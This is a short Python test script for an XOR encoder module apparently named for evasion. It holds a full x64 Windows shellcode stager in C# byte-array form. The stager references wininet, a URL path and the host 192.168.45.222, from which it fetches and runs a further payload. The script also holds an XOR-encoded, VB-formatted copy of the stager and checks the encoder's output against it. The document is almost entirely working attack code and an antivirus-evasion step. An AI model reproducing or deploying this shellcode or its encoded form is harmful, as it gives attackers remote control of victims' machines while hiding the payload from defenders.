import ev_xor

shellcode = "byte[] buf = new byte[732] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x51,0x56,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x4d,0x31,0xc9,0x48,0x0f,0xb7,0x4a,0x4a,0x48,0x8b,0x72,0x50,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x41,0x51,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x4d,0x31,0xc9,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,0x07,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,0xe8,0x0f,0x00,0x00,0x00,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x34,0x35,0x2e,0x32,0x32,0x32,0x00,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbe,0x01,0x00,0x00,0x4d,0x31,0xc9,0x53,0x53,0x6a,0x03,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x00,0x00,0x00,0x00,0xff,0xd5,0xe8,0xb1,0x00,0x00,0x00,0x2f,0x38,0x5f,0x45,0x48,0x6b,0x56,0x55,0x71,0x6d,0x4b,0x63,0x56,0x56,0x78,0x52,0x56,0x63,0x46,0x49,0x4e,0x38,0x77,0x63,0x36,0x2d,0x55,0x66,0x78,0x4d,0x50,0x79,0x65,0x6f,0x77,0x69,0x77,0x6f,0x74,0x71,0x77,0x6f,0x39,0x47,0x6a,0x4d,0x67,0x4b,0x32,0x46,0x4d,0x45,0x33,0x6d,0x4d,0x46,0x30,0x33,0x49,0x35,0x73,0x62,0x4b,0x36,0x43,0x34,0x76,0x41,0x38,0x58,0x63,0x44,0x48,0x5a,0x65,0x44,0x72,0x6d,0x33,0x68,0x56,0x69,0x34,0x33,0x4a,0x2d,0x37,0x54,0x48,0x62,0x78,0x72,0x76,0x76,0x33,0x46,0x47,0x58,0x56,0x72,0x52,0x6f,0x39,0x45,0x56,0x68,0x79,0x61,0x6e,0x6e,0x76,0x6f,0x57,0x66,0x38,0x38,0x56,0x76,0x70,0x73,0x42,0x65,0x33,0x57,0x4e,0x52,0x2d,0x50,0x4a,0x48,0x7a,0x4e,0x61,0x62,0x6f,0x59,0x53,0x32,0x4d,0x75,0x79,0x4e,0x70,0x6f,0x58,0x48,0x44,0x6f,0x71,0x64,0x4e,0x6e,0x51,0x57,0x53,0x30,0x4e,0x6d,0x32,0x56,0x6a,0x39,0x43,0x34,0x76,0x52,0x4b,0x37,0x52,0x57,0x6c,0x70,0x62,0x69,0x6d,0x51,0x00,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x00,0x32,0xa8,0x84,0x00,0x00,0x00,0x00,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0x0a,0x5f,0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x00,0x00,0x49,0x89,0xe0,0x6a,0x04,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,0x86,0x00,0x00,0x00,0x00,0xff,0xd5,0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,0x00,0x00,0x49,0xba,0x44,0xf0,0x35,0xe0,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0xff,0xcf,0x74,0x02,0xeb,0xaa,0xe8,0x55,0x00,0x00,0x00,0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x00,0x10,0x00,0x00,0x49,0xba,0x58,0xa4,0x53,0xe5,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x00,0x20,0x00,0x00,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x07,0x48,0x01,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,0xd5};"


poscase = """225, 85, 158, 249, 237, 245, 209, 29, 29, 29, 92, 76, 92, 77, 79, 85, 44, 207, 120, 85, 150, 79, 125, 76, 75, 85, 150, 79, 5, 85, 150, 79, 61, 80, 44, 212, 85, 18, 170, 87, 87, 85, 150, 111, 77, 85, 44, 221, 177, 33, _
124, 97, 31, 49, 61, 92, 220, 212, 16, 92, 28, 220, 255, 240, 79, 85, 150, 79, 61, 150, 95, 33, 85, 28, 205, 123, 156, 101, 5, 22, 31, 92, 76, 18, 152, 111, 29, 29, 29, 150, 157, 149, 29, 29, 29, 85, 152, 221, 105, 122, _
85, 28, 205, 77, 150, 85, 5, 89, 150, 93, 61, 84, 28, 205, 254, 75, 80, 44, 212, 85, 226, 212, 92, 150, 41, 149, 85, 28, 203, 85, 44, 221, 177, 92, 220, 212, 16, 92, 28, 220, 37, 253, 104, 236, 81, 30, 81, 57, 21, 88, _
36, 204, 104, 197, 69, 89, 150, 93, 57, 84, 28, 205, 123, 92, 150, 17, 85, 89, 150, 93, 1, 84, 28, 205, 92, 150, 25, 149, 85, 28, 205, 92, 69, 92, 69, 67, 68, 71, 92, 69, 92, 68, 92, 71, 85, 158, 241, 61, 92, 79, _
226, 253, 69, 92, 68, 71, 85, 150, 15, 244, 86, 226, 226, 226, 64, 85, 44, 198, 78, 84, 163, 106, 116, 115, 116, 115, 120, 105, 29, 92, 75, 85, 148, 252, 84, 218, 223, 81, 106, 59, 26, 226, 200, 78, 78, 85, 148, 252, 78, 71, _
80, 44, 221, 80, 44, 212, 78, 78, 84, 167, 39, 75, 100, 186, 29, 29, 29, 29, 226, 200, 245, 18, 29, 29, 29, 44, 36, 47, 51, 44, 43, 37, 51, 41, 40, 51, 47, 47, 47, 29, 71, 85, 148, 220, 84, 218, 221, 163, 28, 29, _
29, 80, 44, 212, 78, 78, 119, 30, 78, 84, 167, 74, 148, 130, 219, 29, 29, 29, 29, 226, 200, 245, 172, 29, 29, 29, 50, 37, 66, 88, 85, 118, 75, 72, 108, 112, 86, 126, 75, 75, 101, 79, 75, 126, 91, 84, 83, 37, 106, 126, _
43, 48, 72, 123, 101, 80, 77, 100, 120, 114, 106, 116, 106, 114, 105, 108, 106, 114, 36, 90, 119, 80, 122, 86, 47, 91, 80, 88, 46, 112, 80, 91, 45, 46, 84, 40, 110, 127, 86, 43, 94, 41, 107, 92, 37, 69, 126, 89, 85, 71, _
120, 89, 111, 112, 46, 117, 75, 116, 41, 46, 87, 48, 42, 73, 85, 127, 101, 111, 107, 107, 46, 91, 90, 69, 75, 111, 79, 114, 36, 88, 75, 117, 100, 124, 115, 115, 107, 114, 74, 123, 37, 37, 75, 107, 109, 110, 95, 120, 46, 74, _
83, 79, 48, 77, 87, 85, 103, 83, 124, 127, 114, 68, 78, 47, 80, 104, 100, 83, 109, 114, 69, 85, 89, 114, 108, 121, 83, 115, 76, 74, 78, 45, 83, 112, 47, 75, 119, 36, 94, 41, 107, 79, 86, 42, 79, 74, 113, 109, 127, 116, _
112, 76, 29, 85, 148, 220, 78, 71, 92, 69, 80, 44, 212, 78, 85, 165, 29, 47, 181, 153, 29, 29, 29, 29, 77, 78, 78, 84, 218, 223, 246, 72, 51, 38, 226, 200, 85, 148, 219, 119, 23, 66, 85, 148, 236, 119, 2, 71, 79, 117, _
157, 46, 29, 29, 84, 148, 253, 119, 25, 92, 68, 84, 167, 104, 91, 131, 155, 29, 29, 29, 29, 226, 200, 80, 44, 221, 78, 71, 85, 148, 236, 80, 44, 212, 80, 44, 212, 78, 78, 84, 218, 223, 48, 27, 5, 102, 226, 200, 152, 221, _
104, 2, 85, 218, 220, 149, 14, 29, 29, 84, 167, 89, 237, 40, 253, 29, 29, 29, 29, 226, 200, 85, 226, 210, 105, 31, 246, 183, 245, 72, 29, 29, 29, 78, 68, 119, 93, 71, 84, 148, 204, 220, 255, 13, 84, 218, 221, 29, 13, 29, _
29, 84, 167, 69, 185, 78, 248, 29, 29, 29, 29, 226, 200, 85, 142, 78, 78, 85, 148, 250, 85, 148, 236, 85, 148, 199, 84, 218, 221, 29, 61, 29, 29, 84, 148, 228, 84, 167, 15, 139, 148, 255, 29, 29, 29, 29, 226, 200, 85, 158, _
217, 61, 152, 221, 105, 175, 123, 150, 26, 85, 28, 222, 152, 221, 104, 207, 69, 222, 69, 119, 29, 68, 166, 253, 0, 55, 23, 92, 148, 199, 226, 200"""

result = ev_xor.xor(shellcode,29)
print(result)
print(result == poscase)
print("-------")
print(poscase)
